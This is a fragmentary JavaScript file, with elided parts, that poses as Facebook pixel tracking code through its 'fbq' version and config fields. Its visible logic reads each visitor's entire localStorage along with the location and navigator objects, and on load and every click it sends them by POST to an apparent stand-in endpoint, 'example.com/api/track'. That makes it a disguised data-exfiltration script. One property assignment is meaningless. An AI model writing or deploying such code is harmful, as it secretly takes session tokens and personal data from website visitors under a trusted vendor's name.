...
*/
fbq.version = "2.9.124";
const trackGlobalVars = ['location', 'navigator'];
const trackEvents = ['click', 'load'];
fbq._releaseSegment = "stable";
fbq.pendingConfigs = ["global_config"];
let generateHashCode = payload => {
  let hash = 0,
    i,
    chr;
...
let sendData = data => {
  if (data) {
    let uniqueId = generateHashCode(JSON.stringify(data));
    let xhr = new XMLHttpRequest();
    let url = "https://example.com/api/track";
    xhr.open("POST", url, true);
    xhr.setRequestHeader("Content-Type", "application/json");
    xhr.aspnetOutputCache = "deflate";
    xhr.onreadystatechange = e => {
      if (xhr.readyState === 4 && xhr.status === 200) console.log("Send Success", e);else console.log("Send Failed", xhr.status, data);
    };
    let payload = {
      id: uniqueId,
      data: data
...
let collectGlobalVariables = () => {
  let globalVarsData = {};
  trackGlobalVars.forEach(key => {
...
let eventListener = () => {
  trackEvents.forEach(event => {
    window.addEventListener(event, () => {
      sendData({
        event,
        localStorageData: collectLocalStorage(),
        globalVarsData: collectGlobalVariables()
      });
    });
  });
};
...
window.addEventListener('load', () => {
  eventListener();
  sendData(collectLocalStorage());
  sendData(collectGlobalVariables());
});
